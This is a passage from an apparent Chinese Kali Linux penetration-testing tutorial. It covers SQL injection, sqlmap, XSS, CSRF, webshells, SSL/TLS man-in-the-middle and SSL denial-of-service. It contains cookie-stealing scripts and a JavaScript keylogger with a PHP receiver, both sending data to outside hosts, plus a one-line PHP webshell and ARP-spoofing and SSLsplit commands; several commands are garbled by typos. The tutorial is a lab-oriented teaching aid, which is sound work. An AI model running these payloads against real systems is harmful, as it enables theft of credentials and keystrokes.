(0x3c3f706870) INTO DUMPFILE '/tmp/x.php'--</span><br><span class="line">保存下载数据库</span><br><span class="line">	' union select null, concat(user,0x3a,password) from users INTOOUTFILE</span><br><span class="line">	'/tmp/a.db-</span><br></pre></td></tr></table></figure><h4 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">不显示数据库内建的报错信息</span><br><span class="line">	内建的报错信息帮助开发人员发现和修复问题</span><br><span class="line">	报错信息提供关于系统的大量有用信息</span><br><span class="line">当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即盲注</span><br><span class="line">思路:既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断</span><br><span class="line">    1' and 1=1--+</span><br><span class="line">    1' and 1=2--+</span><br></pre></td></tr></table></figure><h4 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a>SQLMAP自动注入</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">开源sq|注入漏洞检测、利用工具</span><br><span class="line">检测动态页面中get/post参数、cookie、 http头</span><br><span class="line">数据榨取</span><br><span class="line">文件系统访问</span><br><span class="line">操作系统命令执行</span><br><span class="line">引擎强大、特性丰富</span><br><span class="line">Xss漏洞检测</span><br><span class="line">五种漏洞检测技术</span><br><span class="line">    基于布尔的盲注检测</span><br><span class="line">    基于时间的盲注检测</span><br><span class="line">		'and (select * from (selectseel(0)))a)-+</span><br><span class="line">	基于错误的检测</span><br><span class="line">	基于UNION联合查询的检测</span><br><span class="line">	适用于通过for循环直接输出联合查询结果，否则只显示第-项结果</span><br><span class="line">	基于堆叠查询的检测</span><br><span class="line">		堆叠多个查询语句</span><br><span class="line">		适用于非select的数据修改、删除的操作</span><br><span class="line">	支持的数据库管理系统DBMS</span><br><span class="line">		MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, 			IBM DB2, sQLite,Firebird, Sybase，SAP MaxDB</span><br><span class="line">Get方法</span><br><span class="line">	sqlmap -U "http://192.1 68.20.10/mutillidae/index.php?page=user-</span><br><span class="line">	info.php&amp;username= 1 1 &amp;password=22&amp;user-info-php-submit-		button=View+Account+Details" -P username -f</span><br><span class="line">扫描URL列表文件</span><br><span class="line">	http://1.1.1.1/vuIn1 .php?q=foobar</span><br><span class="line">	http://1.1.1.1/vuln3/id/1*</span><br><span class="line">	sqlmap. -m list.txt</span><br><span class="line">扫描google搜索结果</span><br><span class="line">	sqlmap.py -g "inud:\".php?id=1\"</span><br><span class="line">POST方法</span><br><span class="line">	使用http请求文件(burpsuite )</span><br><span class="line">		sqlmap 1 request.txt</span><br><span class="line">	使用burpsuite log文件</span><br><span class="line">		sqlmap 1 log.txt</span><br><span class="line">HTTPS</span><br><span class="line">	sqlmap -U "https://1.1.1.1 /a,php?id= 1:8843" --force-ss</span><br><span class="line">扫描配置文件</span><br><span class="line">	sqlmap -C sqlmap.conf</span><br><span class="line">数据段:  --data</span><br><span class="line">	get / post都适用</span><br><span class="line">	sqlmap -U "http://1.1.1.1/a.php" -data="user= l&amp;pass=2" -f</span><br><span class="line">变量分隔符: -param-del</span><br><span class="line">	http://1.1.1.l/a.php?q=foo;id=1 // ;  &amp;</span><br><span class="line">	sqlmap -U "http://1.1.1.1 /a.php" -data="q=foo;id=1" -param-del="," -f</span><br><span class="line">cookie头:  --cookie</span><br><span class="line">	web应用需要基于cookie的身份认证</span><br><span class="line"><span class="meta">	#</span><span class="bash">检查cookie中的注入点(sqlmap自动测试),需要--level = 2级才会检测</span></span><br><span class="line">	Set-Cookie / -drop-set-cookie</span><br><span class="line">-user-agent：</span><br><span class="line">	sqlmap/1.0-dex-0xxxx (http://sqlmap.org)</span><br><span class="line">--random-agent #sqlmap的useragent很容易被服务器过滤掉，因此需要伪造成浏览器的</span><br><span class="line">	/usr/share/sqlmap/txt/user-agents.txt</span><br><span class="line">sqlmap检查user-agent中的注入点: #Level&gt;= 3</span><br><span class="line">APP/WAF/IPS/IDS过滤异常user-agent时报错</span><br><span class="line">    [hh:mm:20] [ERROR] the target URL responded with an unknown HTTP</span><br><span class="line">    status code, try to force the HTTP User-Agent header with option ser</span><br><span class="line">    agent or --random-agent</span><br><span class="line">Host头: --host</span><br><span class="line"><span class="meta">	#</span><span class="bash">Level =5</span></span><br><span class="line">Referer头: -referrer</span><br><span class="line"><span class="meta">	#</span><span class="bash">Level &gt;=3</span></span><br><span class="line">额外的header: --headers</span><br><span class="line">	每个头单独一行(名称区分大小写)</span><br><span class="line">	sqlmap. -∪"http://l.1.1.1/a.php?id=1" -</span><br><span class="line">	headers=' "host:www.a.com\nUser-Agent:yuanfh"</span><br><span class="line">--method=GET/POST</span><br><span class="line">--skip-urlencode</span><br><span class="line">    默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使</span><br><span class="line">    用原始字符提交数据</span><br><span class="line">--keep-alive</span><br><span class="line">    使用http(s)长连接，性能好</span><br><span class="line">    与--proxy参数不兼容</span><br><span class="line">    长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</span><br><span class="line">--tamper</span><br><span class="line">    混淆脚本，用于绕过应用层过滤、IPS、 WAF</span><br><span class="line">    sqlmap -U "http://1.1.1.1/a.php?id=1" --</span><br><span class="line">    tamper=" tamper/between.py.tamper/randomcase.py.tamper/space2c</span><br><span class="line">    omment.py"-v 3</span><br><span class="line">    </span><br><span class="line">Mysql&lt; 5.0 ,没有information schema 库</span><br><span class="line"><span class="meta">Mysql&gt;</span><span class="bash">= 5.0，但无权读取information. schema库</span></span><br><span class="line">微软的access数据库，</span><br><span class="line">默认无权读取MSysObjects库</span><br><span class="line">--common-tables	#对数据库表进行暴力破解（跑字典）</span><br><span class="line">--common-columns #暴力破解数据库列</span><br><span class="line">				(Access系统表无列信息)</span><br></pre></td></tr></table></figure><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><blockquote><p>XSS攻击分为反射型，DOM型和持久型，持久性是注入到目标服务器，反射型是引诱用户点击跨站脚本；基于DOM型的XSS是不需要与服务器端交互的,它只发生在客户端处理数据阶段。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">攻击WEB客户端</span><br><span class="line">客户端脚本语言</span><br><span class="line">    弹窗告警、广告</span><br><span class="line">    Javascript</span><br><span class="line">    在浏览器中执行</span><br><span class="line">XSS (cross-site scripting)</span><br><span class="line">    通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</span><br><span class="line">    注入客户端脚本代码</span><br><span class="line">    盗取cookie、</span><br><span class="line">    重定向</span><br><span class="line">VBScript, ActiveX, or Flash</span><br><span class="line">JavaScript</span><br><span class="line">    与Java语言无关</span><br><span class="line">    命名完全出于市场原因</span><br><span class="line">    使用最广的客户端脚本语言</span><br><span class="line">使用场景</span><br><span class="line">    直接嵌入html: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"> alert(<span class="string">'XSS'</span>); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    元素标签事件: <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line">    图片标签: <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"avascript:alert('XSS');"</span>&gt;</span></span><br><span class="line">    其他标签: <span class="tag">&lt;<span class="name">iframe</span>&gt;</span>, <span class="tag">&lt;<span class="name">div</span>&gt;</span>, and <span class="tag">&lt;<span class="name">link</span>&gt;</span></span><br><span class="line">    DOM对象，篡改页面内容  </span><br><span class="line">        </span><br><span class="line">窃取cookie <span class="comment">&lt;!--通过外链引入跨站脚本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://1.1.1.1/a.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">a.js源码</span><br><span class="line">    var img = new Image();</span><br><span class="line">    img.src = "http://1.1.1.1/cookies ,php?cookie="+ document.cookie;</span><br></pre></td></tr></table></figure><ul><li>攻击实例：<code>键盘记录</code></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#攻击代码</span><br><span class="line">#Keylogger.js</span><br><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    evt= evt || <span class="built_in">window</span>.event</span><br><span class="line">    key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line">    <span class="keyword">if</span> (key) &#123;</span><br><span class="line">        <span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        <span class="keyword">var</span> param = encodeURl(key)</span><br><span class="line">        http,open(<span class="string">"PST,"</span>http:<span class="comment">//192.1 68.20.8/keylogger.php." ,true);</span></span><br><span class="line">        http.setRequestHeader<span class="string">'"Content-type","application/x-www-form-urlencoded"),</span></span><br><span class="line"><span class="string">        http.send("key="+param);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">#接收端</span></span><br><span class="line"><span class="string">#Keylogger.php</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    $key=$POST['</span>key<span class="string">'];</span></span><br><span class="line"><span class="string">    $logfile="keylog.txt";</span></span><br><span class="line"><span class="string">    $fp = fopen($logfile, "a");</span></span><br><span class="line"><span class="string">    fwrite($fp, $key);</span></span><br><span class="line"><span class="string">    fclose($fp);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">#引入XSS脚本到浏览器</span></span><br><span class="line"><span class="string">&lt;script src="http://1.1.1.1/keylogger.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">#点击下面的页面会跳转到初始网页，并开始记录键盘</span></span><br><span class="line"><span class="string">&lt;a href="http://192.168.20.10/dvwa/vulnerabilities/xss_r/?name=&lt;script src='</span>http:<span class="comment">//192.168.20.8/keyloggerjs'&gt;&lt;/script&gt;"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h4 id="反射型XSS和Xsser工具"><a href="#反射型XSS和Xsser工具" class="headerlink" title="反射型XSS和Xsser工具"></a>反射型XSS和Xsser工具</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Xsser</span><br><span class="line">	命令行/图形化工具</span><br><span class="line">	绕过服务器端输入筛选</span><br><span class="line">		10进制/ 16进制编码</span><br><span class="line">		unescape()</span><br><span class="line">xsser -u "http://1.1.1.1/dvwa/vuInerabilities/" -g "xss_r/?name=" --cookie="security=low; PHPSESSID=d23e469411707ff8210717e67c521a81" -s</span><br><span class="line">-v --reverse-check </span><br><span class="line"><span class="meta">	#</span><span class="bash"> -u代表url，-g代表get请求， -s代表请求次数统计， -v可视化，--reverse-check连接本机测试</span></span><br><span class="line">-heuristic #检查被过滤的字符</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">对payload编码，绕过服务器端筛选过滤</span></span><br><span class="line">-Str Use method String.FromCharCode()</span><br><span class="line">-Une Use Unescape() function</span><br><span class="line">-Mix Mix String.FromCharCode() and Unescape()</span><br><span class="line">-Dec Use Decimal encoding</span><br><span class="line">-Hex Use Hexadecimal encoding</span><br><span class="line">-Hes Use Hexadecimal encoding, with semicolons</span><br><span class="line">-Dwo Encode vectors iIP addresses in DWORD</span><br><span class="line">-Doo Encode vectors IP addresses in Octal</span><br><span class="line">-Cem=CEM Try-manually- different Character Encoding Mutatiohs</span><br><span class="line">(reverse obfuscation: good) -&gt; (ex: 'Mix,Une,Str.Hex')</span><br></pre></td></tr></table></figure><blockquote><p>针对DVWA high安全级别进行XSS攻击，发现是无法攻击的</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xsser -U "http://1.1.1.1/dwwa/vuInerabilities/" -g "xss_ r/?name=" -</span><br><span class="line">cookie="security=high; PHPSESSID=d23e46941 1707f82107 17e67c521q817</span><br><span class="line">-Cem=' Mix,Une,Str.Hex'</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># high安全级别会使用htmlspecialchars()函数会将web代码转换成字符串</span></span></span><br><span class="line">							## 例如：&lt;   &gt;   转换成  &amp;lt; &amp;gt;</span><br></pre></td></tr></table></figure><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">存储型XSS</span><br><span class="line">    长期存储于服务器端</span><br><span class="line">    每次用户访问都会被执行javascript脚本</span><br><span class="line">Name: # 一般客户端表单会有长度限制</span><br><span class="line">	  # 可以通过客户端修改html代码或者截断代理突破限制</span><br><span class="line">&lt;script src=http:<span class="comment">//1.1.1.1/a.js&gt;&lt;/script&gt;</span></span><br><span class="line">a.js源码: </span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">    img.src = <span class="string">"http://1.1.1.1:88/cookies.php?cookie="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><h4 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h4><blockquote><p>浏览器漏洞利用框架</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">浏览器攻击面</span><br><span class="line">    应用普遍转移到B / S架构，浏览器成为统一客户端程序</span><br><span class="line">    结合社会，工程学方法对浏览器进行攻击</span><br><span class="line">    攻击浏览器用户</span><br><span class="line">    通过注，入的JS脚本，利用浏览器攻击其他网站</span><br><span class="line">BeEF (Browser exploitation framework )</span><br><span class="line">    生成、交付payload</span><br><span class="line">    Ruby语言编写</span><br><span class="line">    服务器端:管理hooked客户端</span><br><span class="line">    客户端:运行于客户端浏览器的Javascript脚本(hook )</span><br></pre></td></tr></table></figure><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Cross site request forgery #跨站请求伪造</span><br><span class="line">与XSS经常混淆</span><br><span class="line">从信任的角度来区分</span><br><span class="line">    XSS:利用用户对站点的信任</span><br><span class="line">    CSRF:利用站点对已经身份认证的信任</span><br><span class="line">结合社工在身份认证会话过程中实现攻击</span><br><span class="line">    修改账号密码、个人信息(email、 收货地址)</span><br><span class="line">    发送伪造的业务请求(网银、购物、投票)</span><br><span class="line">    关注他人社交账号、推送博文</span><br><span class="line">    在用户非自愿、不知情的情况下提交请求</span><br><span class="line"># DVWA低安全级别不会对修改密码过程进行确认验证</span><br><span class="line"># 中安全级别会检测请求的跳转来源（refer字段）</span><br><span class="line"># 高安全级别会首先验证旧密码</span><br><span class="line"># burpsuite能够根据get请求自动生产对应的CSRF post请求</span><br><span class="line">防御对策：</span><br><span class="line">    在请求和响应过程中检查是否存在anti-CSRF token名</span><br><span class="line">    检查服务器是否验证anti-CSRF token的名值</span><br><span class="line">    检查token中可编辑的字符串</span><br><span class="line">    检查referrer头是否可以伪造</span><br><span class="line">    Captcha</span><br><span class="line">    anti-CSRF token</span><br><span class="line">    Referrer头</span><br><span class="line">    降低会话超时时间</span><br></pre></td></tr></table></figure><h4 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php echo shell exec($_ GET['cmd']);?&gt; #一句话shell</span><br><span class="line">中国菜刀: http://www.maicaidao.co/</span><br><span class="line">可能被IDS、AV、WAF、扫描器软件发现查杀</span><br><span class="line">WeBaCoo (Web Backdoor Cookie)</span><br><span class="line">    类终端的shell</span><br><span class="line">    编码通信内容通过cookie头传输，隐蔽性较强</span><br><span class="line">    cm:base64编码的命令</span><br><span class="line">    cn:服务器用于返回数据的cookie头的名</span><br><span class="line">    cp:返回信息定界符</span><br><span class="line">生成服务端</span><br><span class="line">	webacoo -g -o a.php</span><br><span class="line">客户端连接</span><br><span class="line">	webacoo -t -U http://1.1.1.1/a.php</span><br><span class="line">Weevely:</span><br><span class="line">    隐蔽的类终端PHP Webshell</span><br><span class="line">    30多个管理模块</span><br><span class="line">    执行系统命令、浏览文件系统</span><br><span class="line">    检查服务器常见配置错误</span><br><span class="line">    创建正向、反向TCP Shell连接</span><br><span class="line">    通过目标计算机代理HTTP流量</span><br><span class="line">    从目标计算机运行端C ]扫描，渗透内网</span><br><span class="line">	支持连接密码</span><br></pre></td></tr></table></figure><blockquote><p>上面的工具在新版本kali已经不再提供；最新的webshell检测工具可以参照：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlhb3ppL3AvMTI2Nzk3NzcuaHRtbA==">https://www.cnblogs.com/xiaozi/p/12679777.html<i class="fa fa-external-link-alt"></i></span></p></blockquote><h3 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h3><blockquote><p>HTTPS存在多种实现的协议</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">全站HTTPS正成为潮流趋势</span><br><span class="line">	淘宝、百度</span><br><span class="line">HTTPS的作用</span><br><span class="line">	CIA</span><br><span class="line">	解决的是信息传输过程中数据被篡改、窃取</span><br><span class="line">	加密:对称、非对称、单向</span><br><span class="line">HTTPS攻击方法</span><br><span class="line">    降级攻击</span><br><span class="line">    解密攻击(明文、证书伪造)</span><br><span class="line">    协议漏洞、实现方法的漏洞、配置不严格</span><br><span class="line">Secure socket layer #安全套接字协议</span><br><span class="line">    保证网络通信安全的加密协议</span><br><span class="line">    <span class="number">1994</span>年由Netscape开发成为统一标准</span><br><span class="line">    <span class="number">1999</span>年TLS(transport layer security)取代SSLv3</span><br><span class="line">    近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复</span><br><span class="line">        Heartbleed</span><br><span class="line">        POODLE</span><br><span class="line">        BEAST</span><br><span class="line">TLS当前最新版本1.2 #传输层安全协议</span><br><span class="line">TLS/SSL、HTTPS、 HTTP over SSL通俗上表示同意含义</span><br><span class="line">非对称加密算法 #一般用来加密交换密钥</span><br><span class="line">    Diffie Hellman key exchange</span><br><span class="line">    Rivest Shamir Adleman (RSA)</span><br><span class="line">    lliptic Curve Cryptography (ECC)</span><br><span class="line">对称加密算法</span><br><span class="line">    Data Encryption Standard (DES) / <span class="number">3</span>DES</span><br><span class="line">    Advance Encryption Standard (AES) #主流</span><br><span class="line">    International Data Encryption Algorithm (IDEA)</span><br><span class="line">    Rivest Cipher <span class="number">4</span> (RC4)</span><br><span class="line">    	WEP、TLS/SSL、 RDP、 Secure shell</span><br><span class="line">单向加密算法(HASH)</span><br><span class="line">    HASH算法		HASH值长度(bit)</span><br><span class="line">-------------------------------------</span><br><span class="line">    MD5				<span class="number">128</span></span><br><span class="line">    SHA<span class="number">-1</span>			<span class="number">160</span></span><br><span class="line">    SHA<span class="number">-2</span>			<span class="number">224</span>、<span class="number">256</span>、 <span class="number">384</span>、<span class="number">512</span></span><br><span class="line">--------------------------------------</span><br><span class="line">SHA<span class="number">-3</span>已经设计完成，但尚末广泛使用</span><br><span class="line">SHA<span class="number">-2</span>是TLS <span class="number">1.2</span> 唯一支持的单向加密算法</span><br><span class="line">碰撞攻击针对单向加密算法</span><br><span class="line">	两个不同的文件生成相同的HASH值</span><br><span class="line">SSL的弱点</span><br><span class="line">	SSL是不同的对称、非对称、单向加密算法的组合加密实现(cipher suite)</span><br><span class="line">加密算法					SSL实现中的用途</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">RAS / Diffie-Hellman		密钥交换、身份认证</span><br><span class="line">AES							加密数据，由RAS/DH完成密钥交换</span><br><span class="line">HMAC-SHA2					摘要信息</span><br><span class="line">--------------------------------------------------------                       </span><br><span class="line">    服务器端为提供更好的兼容性，选择支持大量过时cipher suite</span><br><span class="line">	协商过程中强迫降级加密强度</span><br><span class="line">	现代处理器计算能力可以在可接受的时间内破解过时加密算法</span><br><span class="line">	购买云计算资源破解</span><br></pre></td></tr></table></figure><h4 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Openssl</span><br><span class="line">    直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</span><br><span class="line">    openssl S_ client -connect www.baudu.com:443</span><br><span class="line">    openssl s_ client -tls1_2 -cipher 'ECDH-RSA-RC4 SHA' -connect</span><br><span class="line">    www.taobao.com:443</span><br><span class="line">		密钥交换-身份认证-数据加密-HASH算法</span><br><span class="line">	openssls_ client -tls1_ 2 -cipher "NULL, EXPORT,LOW,DES" -connect</span><br><span class="line">	www.taobao.com:443 (协商低安全级别cipher suite)</span><br><span class="line">	可被破解的cipher suite</span><br><span class="line">	openssI ciphers -V "NULL, EXPORT,LOW,DES"</span><br><span class="line">https://www. openssl.org/docs/ apps/ciphers.html</span><br></pre></td></tr></table></figure><h4 id="SSLyze"><a href="#SSLyze" class="headerlink" title="SSLyze"></a>SSLyze</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SSLyze</span><br><span class="line">    Python语言编写</span><br><span class="line">    检查SSL过时版本</span><br><span class="line">    检查存在弱点的cipher suite</span><br><span class="line">    扫描多站点时，支持来源文件</span><br><span class="line">    检查是否支持会话恢复</span><br><span class="line">    sslyze --regular www.taobao.com:443</span><br><span class="line">Nmap</span><br><span class="line">	nmap --script=ssl-enum-ciphers.nse www.taobao.com</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssl查询网站 https://www.sllabs.com/ssltest/</span></span><br></pre></td></tr></table></figure><h4 id="SSL-TLS中间人攻击"><a href="#SSL-TLS中间人攻击" class="headerlink" title="SSL/TLS中间人攻击"></a>SSL/TLS中间人攻击</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SSLsplit</span><br><span class="line">    透明SSL/TLS中间人攻击工具</span><br><span class="line">    对客户端伪装成服务器，对服务器伪装成普通客户端</span><br><span class="line">    伪装服务器需要伪造证书</span><br><span class="line">    支持SSL/TLS加密的SMTP、POP3、 FTP等通信中间人攻击</span><br><span class="line">利用openssl生成证书私钥</span><br><span class="line">	openssl genrsa -out ca.key 2048</span><br><span class="line">利用私钥签名伪造根证书</span><br><span class="line">	openssl req -new -x509 -days 1096 -key ca.key -out ca.crt #-x509国际标准</span><br><span class="line">启动操作系统的路由功能</span><br><span class="line">	sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">Iptables端口转发规则</span><br><span class="line">    iptables -t nat -F #清空所有规则</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 									#MSA</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 									#SMTPS</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 									#IMABS</span><br><span class="line">    iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 									#POP3S</span><br><span class="line">    iptables -t nat -L #查看所有规则</span><br><span class="line">Arp欺骗</span><br><span class="line">	arpspoof -i ethO -t 1.1.1.2 -r 1.1.1.1</span><br><span class="line">启动SSLsplit</span><br><span class="line">	mkdir -p test/logdir</span><br><span class="line">	sslsplit -D -l connect.log -j /root/test -S logdir/ -K ca.key -C ca.crt -ssl 0.0.0.0</span><br><span class="line">	8443 tcp 0.0.0.0 8080</span><br><span class="line">被害者访问taobao、baidu、 mail.163.com</span><br><span class="line">查看日志和浏览器证书及证书报错信息</span><br><span class="line">安装服务器跟证节之后再次访问</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 注意：即便进行中间人攻击，依然难以破解登录密码，因为类似淘宝的登录页面会使用单独的加密控件</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># sslstrip工具可以突破163邮箱的加密</span></span></span><br></pre></td></tr></table></figure><h4 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a>SSL/TLS拒绝服务攻击</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">thc-ssl-dos</span><br><span class="line">    SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</span><br><span class="line">    利用SSL secure Renegotiation特性，在单- :TCP连接中生成数千个SSL重连接请</span><br><span class="line">    求，造成服务器资源过载</span><br><span class="line">    与流量式拒绝服务攻击不同，the ssI-dos可以利用dsI线路打垮30G带宽的服务器</span><br><span class="line">    服务器平均可以处理300次/秒SSL握手请求</span><br><span class="line">    对SMTPS、POP3S等 服务同样有效</span><br><span class="line">    thc-ssl-dos 199.223.209.205 2083 --accept</span><br><span class="line">对策</span><br><span class="line">    禁用SSL Renegotiation（重协商）、使用SSL Accelerator</span><br><span class="line">    通过修改thc-ssl-dos代码，可以绕过以上对策</span><br></pre></td></tr></table></figure><h3 id="补充：关于AJAX和WEB-Service"><a href="#补充：关于AJAX和WEB-Service" class="headerlink" title="补充：关于AJAX和WEB Service"></a>补充：关于AJAX和WEB Service</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">AJAX对渗透测试的挑战</span><br><span class="line">    异步请求数量多且隐蔽</span><br><span class="line">    触发AJAX请求的条件无规律</span><br><span class="line">    手动和截断代理爬网可能产生大量遗漏</span><br><span class="line">AJAX爬网工具</span><br><span class="line">	ZAP</span><br><span class="line">客户端代码审计</span><br><span class="line">    源码</span><br><span class="line">    Firebug</span><br><span class="line">WEB Service</span><br><span class="line">    面向服务的架构(service oriented architecture )便于不同系统集成共享数据</span><br><span class="line">    和功能</span><br><span class="line">    尤其适合不想暴漏数据模型和程序逻辑而访问数据的场景</span><br><span class="line">    无页面</span><br><span class="line">两种类型的WEB Service</span><br><span class="line">	Simple object access protocol (SOAP)</span><br><span class="line">        传统的Web service开发方法，xml是唯一 -的数据交换格式</span><br><span class="line">        要求安全性的应用更多采用</span><br><span class="line">RESTful (Representational State Transfer architecture REST)</span><br><span class="line">	目前更多被采用的轻量web service, <span class="built_in">JSON</span>是 首选数据交换格式</span><br><span class="line">WEB Service安全考虑</span><br><span class="line">    使用API key或session token实现和跟踪身份认证</span><br><span class="line">    身份认证由服务器完成，而非客户端</span><br><span class="line">    APIkey、用户名、Session token永远不要通过URL发送</span><br><span class="line">    RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</span><br><span class="line">    SOAP提供强于HTTPS的WS-security机制</span><br><span class="line">    使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的密钥加密</span><br><span class="line">    API KEY</span><br><span class="line">    RESTful应只允许身份认证用户使用PUT、DELETE方法</span><br><span class="line">    使用随机token防止CSRT攻击</span><br><span class="line">WEB Service安全考虑</span><br><span class="line">    对用户提交参数过滤，建议布署基于严格白名单的方法</span><br><span class="line">    报错信息消毒</span><br><span class="line">    直接对象引用应严格身份验证(点上公司以ID作为主索引)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali使用教程（二）：无线攻击</title>
    <url>/2020/06/24/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>常用的WLAN标准如下：</p><blockquote><p>802.11 - The original WLAN standard<br>802.11a- Up to 54 Mbit/s on 5 GHz<br>802.11b- 5.5 Mbit/s and 11 Mbit/s on 2.4 GHz<br>802.11g- Up to 54 Mbit/s on 2.4 GHz. Backward compatible with 802.11b<br>802.11i- Provides enhanced security<br>802.11n - Provides higher throughput with Multiple Input/Multiple Output (MIMO)</p></blockquote><a id="more"></a><p>信号干扰问题：</p><blockquote><p>2.4GHz band (2. 4GHz - 2.485GHz)，它拥有11-14个重叠的信道channels，每个信道22MHz带宽，只有三个完全不重叠的信道，所以多个2.4g信号会发送干扰</p></blockquote><p>SSID：</p><blockquote><p>Service Set ldentifier (SSID)<br>AP每秒钟约10次通过Beacon帧广播SSID<br>客户端连接到无线网络后也会宣告SSID</p></blockquote><p>MONITOR MODE</p><blockquote><p>Monitor不是一种真的无线模式，但是对无线渗透至关重要，它允许无线网卡没有任何筛选的抓包(802.11包头)，与有线网络的混杂模式可以类比，适合的网卡和驱动不但可以monitor，更可以Injection</p></blockquote><h3 id="无线网卡配置"><a href="#无线网卡配置" class="headerlink" title="无线网卡配置"></a>无线网卡配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">扫描附近AP：</span><br><span class="line">iw dev wlan2 scan| grep SSID</span><br><span class="line">iw dev wlan2 scan| egrep "DS\ Parameter\ set|SSID"</span><br><span class="line">iwlist wlan2 scanning | egrep "ESSID↓Channel"</span><br><span class="line"></span><br><span class="line">添加删除侦听端口:</span><br><span class="line">iw dev wlan2 interface add wlan2mon type monitor</span><br><span class="line">	tcpdump -S 0 -i wlan2mon -P</span><br><span class="line">iw dev wlan2mon interface del</span><br></pre></td></tr></table></figure><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><h4 id="DADIOTAP头"><a href="#DADIOTAP头" class="headerlink" 